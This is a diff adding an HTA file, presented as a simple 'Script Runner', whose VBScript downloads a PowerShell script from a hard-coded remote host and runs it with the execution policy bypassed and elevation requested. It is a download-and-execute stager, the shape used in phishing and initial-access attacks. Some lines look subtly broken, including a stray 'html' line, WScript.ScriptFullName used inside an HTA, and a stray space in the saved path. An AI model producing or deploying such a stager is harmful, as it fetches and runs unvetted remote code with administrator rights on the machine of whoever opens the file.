@@ -1,0 +1,63 @@
+html
+<html>
+<head>
+    <title>Script Runner</title>
+    <HTA:APPLICATION
+        ID="ScriptRunner"
+        APPLICATIONNAME="Script Runner"
+        BORDER="dialog"
+        SHOWINTASKBAR="yes"
+        SINGLEINSTANCE="no"
+        WINDOWSTATE="normal"
+        SCROLL="no"
+        ICON="icon.ico"
+        INNERBORDER="yes"
+        MAXIMIZEBUTTON="no"
+        MINIMIZEBUTTON="yes"
+        SYSMENU="yes"
+        NAVIGABLE="yes"
+    />
+
+    <script language="VBScript">
+        Sub DownloadScript()
+            Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+            url = "http://192.168.100.161:8000/NavyBeck/slider.ps1"
+            objXMLHTTP.open "GET", url, False
+            objXMLHTTP.send
+
+            If objXMLHTTP.Status = 200 Then
+                Set objStream = CreateObject("ADODB.Stream")
+                objStream.Open
+                objStream.Type = 1
+                objStream.Write objXMLHTTP.ResponseBody
+                objStream.Position = 0
+
+                Set objFSO = CreateObject("Scripting.FileSystemObject")
+                filepath = objFSO.GetParentFolderName( WScript.ScriptFullName ) & "\ slider.ps1"
+                objStream.SaveToFile filepath
+                objStream.Close
+
+                MsgBox "Script downloaded successfully."
+            Else
+                MsgBox "Error downloading the script."
+            End If
+        End Sub
+
+        Sub RunScript()
+            Set objShell = CreateObject("Shell.Application")
+            objShell.ShellExecute "powershell.exe", "-ExecutionPolicy Bypass -File ""slider.ps1""", "", "runas", 1
+        End Sub
+    </script>
+</head>
+<body>
+    <h1>Script Runner</h1>
+    <button onclick="DownloadScript()">Download Script</button>
+    <button onclick="RunScript()">Run Script</button>
+
+    <script language="VBScript">
+        Sub Window_OnLoad
+            window.resizeTo 400, 200
+        End Sub
+    </script>
+</body>
+</html>
